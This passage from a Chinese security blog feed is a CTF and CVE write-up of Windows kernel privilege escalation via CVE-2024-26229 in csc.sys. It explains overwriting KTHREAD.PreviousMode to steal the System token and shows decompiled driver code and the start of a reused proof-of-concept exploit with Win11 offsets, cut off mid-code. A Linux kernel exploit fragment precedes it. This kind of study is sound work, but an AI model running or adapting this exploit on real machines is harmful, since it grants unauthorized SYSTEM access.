   &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// the parent thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//waiting for the child</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-更复杂的利用——4-5-版本">2. 更复杂的利用——4.5+版本</h2><p>在这个版本，为cred分配的slab 对象池<code>cred_jar</code>在初始化的时候添加了一个flag位<code>SLAB_ACCOUNT</code>，这导致这样的问题，内核驱动中手动调用的kmalloc虽然大小一样，但是和cred_jar不再共享一个对象池。</p><p>这个时候要引出通用的一个解决方案：劫持tty_struct.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;init和exit没有什么特殊内容，就是正常的注册和析构。注册了一个名叫&lt;code&gt;babydev&lt;/code&gt;的字符设备。&lt;/p&gt;
&lt;p&gt;这道题在bss有一个全局变量，包含了一个buf指针和一个长度字段。下面看看这个驱动在干嘛：&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-26229青春版_WindowsKernelPWN</title>
    <link href="https://zjw1nd.github.io/2024/10/08/CVE-2024-26229%E9%9D%92%E6%98%A5%E7%89%88-WindowsKernelPWn/"/>
    <id>https://zjw1nd.github.io/2024/10/08/CVE-2024-26229%E9%9D%92%E6%98%A5%E7%89%88-WindowsKernelPWn/</id>
    <published>2024-10-08T09:25:07.000Z</published>
    <updated>2024-10-18T05:14:13.151Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考资料：<a href="https://www.youtube.com/watch?v=nauAlHXrkIk">https://www.youtube.com/watch?v=nauAlHXrkIk</a></p></blockquote><h1>怎么提权？——前置知识</h1><h2 id="Windows内核交互">Windows内核交互</h2><p>和LINUX类似，它也有ioctl这种的api，只不过windows内核封装了很多东西，提供了一大坨各种各样功能的api。另外，ntdll这个负责和windows内核通信的模块（可以理解成windows上的glibc）里有很多非公开的函数（是的他们有符号，只是没法用include从头文件引入而已），我们通过<code>GetProcAddress</code>这个接口其实能获取到各种函数的地址。</p><p>虽然有KASLR但其实没用，因为windows有一个接口叫做<code>NtQuerySystemInformation</code>几乎会告诉我们所有内核相关的地址信息…太有feature了。</p><p>其实是用<code>NtQuerySystemInformation</code>可以按参数选定类别查信息，直接就能查到所有进程的handle以及管理他们的eproc结构体地址，PID为4的是一个系统进程，有高权限，而我们当前进程也可以用api查。然后我们的准备工作就完成了。</p><h2 id="Windows进程权限">Windows进程权限</h2><p>在Windows内核提权中，用户态的PEB信息没什么用，重要的是内核中的EPROCESS.每个进程在内核中都有一个EPROCESS结构体进行管理，里面存了UID和一个用于权限鉴别的token，和当前用户挂钩。如果我们能够篡改掉这个token我们的进程就有更高的权限了，类似于<code>commit_creds(prepare_cred(0))</code>这种。但token是这么一个结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* Object;                                                       <span class="comment">//0x0</span></span><br><span class="line">        ULONGLONG RefCnt:<span class="number">4</span>;                                                 <span class="comment">//0x0</span></span><br><span class="line">        ULONGLONG Value;                                                    <span class="comment">//0x0</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>类似于cookie，这个东西自己伪造不太现实，不过我们可以偷。和准备工作中说的一样，我们如果能从系统权限的EPROCESS偷一个高权限token复制进来就好了，这就要求我们有内核地址空间写的权限。</p><h2 id="内核地址空间写入">内核地址空间写入</h2><p>首先有一个好消息，那就是我们Windows也有自己的write：任意虚拟地址写入的API<code>NtWriteVirtualMemory</code>。这个函数会经过<code>ntdll!NtWriteVirtualMemory-&gt;nt!NtWriteVirtualMemory</code>,而最后内核的函数是对<code>MiWriteVirtualMemory</code>的包装。</p><p>但是想写不是那么容易的，通过windbg调试可以知道，如果是用户空间发起的写请求，地址会被windows严格的筛一遍，有三四个检查好像，包括直接和<code>0x7fff..000</code>硬比较，也就是用户地址空间肯定是全ban的。视频截图中可以看到：<br><img src="/images/SnapShot_video.png" alt="Snapshot_video.png"></p><p>那么有没有办法能绕过呢？还是看这个包装后的内部系统调用，它用<code>gs:[188h]</code>取了当前的thread，然后检查了一个叫做PreviousMode的字段。这个字段标识一个线程在发起系统调用请求的时候来自于用户还是内核，1表示用户0表示内核。如果它来自内核，那么写入就不会对地址进行那一大堆检查。因此我们要做的就是想办法在我们当前进程的线程kthread结构体中为previousmode字段写入0，这也是核心漏洞点：<strong>任意地址写0</strong></p><h1>漏洞分析</h1><h2 id="题目驱动分析">题目驱动分析</h2><p>漏洞点在任意地址写0，先以这次的招新赛的青春版驱动为例，ida打开，很简单，观察驱动初始化函数发现除了构建和析构以外还有个疑似ioctl的函数，这个函数在驱动对象结构体的<code>DriverObject-&gt;MajorFunction[14]</code>注册，是<code>IO_DEVICE_CONTROL</code>函数（没错和libc类似也是用宏定义函数功能和注册位置）。不得不说，IDA对windows的支持确实好。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __fastcall <span class="title function_">init_driver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DeviceName</span>;</span> <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  _UNICODE_STRING DestinationString; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+70h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceName = <span class="number">0LL</span>;</span><br><span class="line">  DestinationString = <span class="number">0LL</span>;</span><br><span class="line">  RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\n0000b&quot;</span>);</span><br><span class="line">  RtlInitUnicodeString(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\n0000b&quot;</span>);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;Init Driver\r\n&quot;</span>);</span><br><span class="line">  DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)delete_module;</span><br><span class="line">  result = IoCreateDevice(DriverObject, <span class="number">0</span>, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DeviceObject-&gt;Flags |= <span class="number">4u</span>;</span><br><span class="line">    v3 = IoCreateSymbolicLink(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      memset64(DriverObject-&gt;MajorFunction, (<span class="type">unsigned</span> __int64)entry, <span class="number">0x1B</span>uLL);</span><br><span class="line">      DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)func;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      IoDeleteDevice(DeviceObject);</span><br><span class="line">      <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IOCTL函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">func</span><span class="params">(__int64 a1, IRP *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_STACK_LOCATION</span> *<span class="title">CurrentStackLocation</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// edi</span></span><br><span class="line">  DWORD LowPart; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Create.Options == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LowPart = CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart;</span><br><span class="line">    <span class="keyword">if</span> ( LowPart == <span class="number">0x222450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">&quot;Hello world!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( LowPart == <span class="number">0x223450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      vuln_write(a2-&gt;AssociatedIrp.MasterIrp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;Error IOCTL Code\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0xC0000229</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0LL</span>;</span><br><span class="line">  a2-&gt;IoStatus.Status = v3;</span><br><span class="line">  IofCompleteRequest(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们看到这个LowPart是0x223450的时候调用的函数是对参数解引用两次后任意地址写0（这其实就是cve26229的青春版，只是那个要逆向一个真实的服务，这里就简化了而已）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.text:00000001400010AC ;   __try &#123; // __except at loc_1400010B3</span><br><span class="line">.text:00000001400010AC                 mov     rax, [rcx]</span><br><span class="line">.text:00000001400010AF                 mov     [rax], bl ; vuln</span><br><span class="line">.text:00000001400010B1                 jmp     short loc_1400010C4</span><br><span class="line">.text:00000001400010B1 ;   &#125; // starts at 1400010AC</span><br></pre></td></tr></table></figure><h2 id="一些windows驱动相关的知识">一些windows驱动相关的知识</h2><ul class="lvl-0"><li class="lvl-2"><p>IO设备在Windows以一个类似栈的结构堆叠起来，io请求从上到下处理，处理完毕就返回要么就传递给下一层（具体实现不懂，大概这么个思想）</p></li><li class="lvl-2"><p>windows将每一个io请求打包成一个IRP结构传入设备栈</p></li><li class="lvl-2"><p>它的if判断条件似乎是文件的读偏移（IDA F5是这么说的，不过反正最后poc传ioctl代码的时候也传一下就行，无所谓）</p></li><li class="lvl-2"><p>交互其实可以用Ntdll泄露拿函数或者是直接用包装好的也行：<code>DeviceIOControl()</code></p></li></ul><p>下面说一下传入的那个写0的地址我们怎么控制。这个参数IDA识别出是IRP请求的AssociateIRP域下的masterirp。这个AssociateIRP其实是个联合体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>* <span class="title">MasterIrp</span>;</span>                                             <span class="comment">//0x18</span></span><br><span class="line">        LONG IrpCount;                                                      <span class="comment">//0x18</span></span><br><span class="line">        VOID* SystemBuffer;                                                 <span class="comment">//0x18</span></span><br><span class="line">    &#125; AssociatedIrp;   </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在驱动程序创建的时候，如果是METHOD_BUFFERED类型，就会启用第三个域，也就是一个buffer指针</p><blockquote><p>参考自<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/buffer-descriptions-for-i-o-control-codes">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/buffer-descriptions-for-i-o-control-codes</a><br>对于此传输类型，IRP 提供指向 Irp-AssociatedIrp.SystemBuffer&gt; 处缓冲区的指针。 此缓冲区表示在调用 DeviceIoControl 和 IoBuildDeviceIoControlRequest 时指定的输入缓冲区和输出缓冲区。 驱动程序将数据从此缓冲区中传输出去，然后传入此缓冲区。</p><p>对于输入数据，缓冲区大小由驱动程序IO_STACK_LOCATION结构中的 Parameters.DeviceIoControl.InputBufferLength 指定。 对于输出数据，缓冲区大小由驱动程序IO_STACK_LOCATION结构中的 Parameters.DeviceIoControl.OutputBufferLength 指定。</p><p>系统为单个输入/输出缓冲区分配的空间大小是两个长度值中的较大值。</p></blockquote><p>从微软文档能看到，这里其实就是我们在IOCTL的时候传入的输入输出缓冲区。因此只要我们在用户态把缓冲区写好成指向我们拿到的_KTHREAD的PreviousMode，写0后就能利用任意地址写NtWriteVirtualMemory把System(pid 4)的token偷过来，然后重新将PreviousMode写成用户，调用<code>system(&quot;cmd&quot;)</code>即可拿到system shell。</p><h1>CVE-2024-26229</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-282185.htm">https://bbs.kanxue.com/thread-282185.htm</a><br>那么既然都懂了，我们简单看看实际环境下的漏洞复现是怎么样的。原理不用重复，这个CVE用的是Windows上的csc.sys驱动或者说服务。</p></blockquote><blockquote><p>csc.sys驱动是一个处理客户端缓存（Client-Side Caching）和提供离线文件功能的系统驱动（windows默认启用）。csc.sys允许用户在断网的情况下继续访问和操作网络文件，当用户在没有网络连接的情况下对这些文件进行更改时，这些更改首先影响的是本地缓存的副本；一旦网络连接恢复，CSC.sys 会负责将这些本地更改同步回网络位置，确保网络上的数据与本地的副本保持一致。</p></blockquote><p>这个驱动有一个处理文件的函数<code>csc!CscDevFcbXXXControlFile</code>存在问题（只是IOCTL变成文件操作码，用<code>NtFsControlFile</code>控制，逻辑和参数都基本一样）。在传入操作码0x001401a3后会有如下逻辑调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">0x20C</span>) == <span class="number">0x1401A3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = *(_QWORD *)(a1 + <span class="number">0x218</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">0xB8</span>) = <span class="number">0</span>i64;</span><br><span class="line">  *(_QWORD *)(v10 + <span class="number">0x18</span>) = <span class="number">0</span>i64; <span class="comment">// 漏洞利用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处第二个写0利用的是我们传入的input buffer（和这道题一模一样），因此只需要：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">status = pNtFsControlFile(</span><br><span class="line">    handle,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    &amp;iosb,</span><br><span class="line">    <span class="number">0x001401a3</span>,</span><br><span class="line">    (<span class="type">void</span>*)(Curthread + <span class="number">0x232</span> - <span class="number">0x18</span>), <span class="comment">// 漏洞利用</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>即可实现写0.</p><h1>POC</h1><p>VisualStudio 2022，参考自<a href="https://github.com/RalfHacker/CVE-2024-26229-exploit/blob/main/exploit.c">Github上的CVE-2024-26229 Poc</a>. 前面的部分基本没改，查了EPROCESS的token偏移和Ktrhead的PreviousMode偏移在win11 22H2下都是对的，没变化，直接用就好了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CVE-2024-26229 reuse</span></span><br><span class="line"><span class="comment">// https://github.com/RalfHacker/CVE-2024-26229-exploit/blob/main/exploit.c</span></span><br><span class="line"><span class="comment">// PreviousMode覆写提权</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPROCESS_TOKEN_OFFSET0x4B8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KTHREAD_PREVIOUS_MODE_OFFSET0x232</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformation0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformationSize0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> _<span class="title">MODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">KernelMode = <span class="number">0</span>,</span><br><span class="line">UserMode = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">USHORT UniqueProcessId;</span><br><span class="line">USHORT CreatorBackTraceIndex;</span><br><span class="line">UCHAR ObjectTypeIndex;</span><br><span class="line">UCHAR HandleAttributes;</span><br><span class="line">USHORT HandleValue;</span><br><span class="line">PVOID Object;</span><br><span class="line">ULONG GrantedAccess;</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ULONG NumberOfHandles;</span><br><span class="line">SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtWriteVirtualMemory)</span><span class="params">(HANDLE, PVOID, PVOID, ULONG, PULONG)</span>;</span><br><span class="line">_NtWriteVirtualMemory pNtWriteVirtualMemory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtQuerySystemInformation)</span><span class="params">(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG)</span>;</span><br><span class="line">_NtQuerySystemInformation pNtQuerySystemInformation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _RtlInitUnicodeString)</span><span class="params">(PUNICODE_STRING, PCWSTR)</span>;</span><br><span class="line">_RtlInitUnicodeString pRtlInitUnicodeString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtFsControlFile)</span><span class="params">(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG)</span>;</span><br><span class="line">_NtFsControlFile pNtFsControlFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title 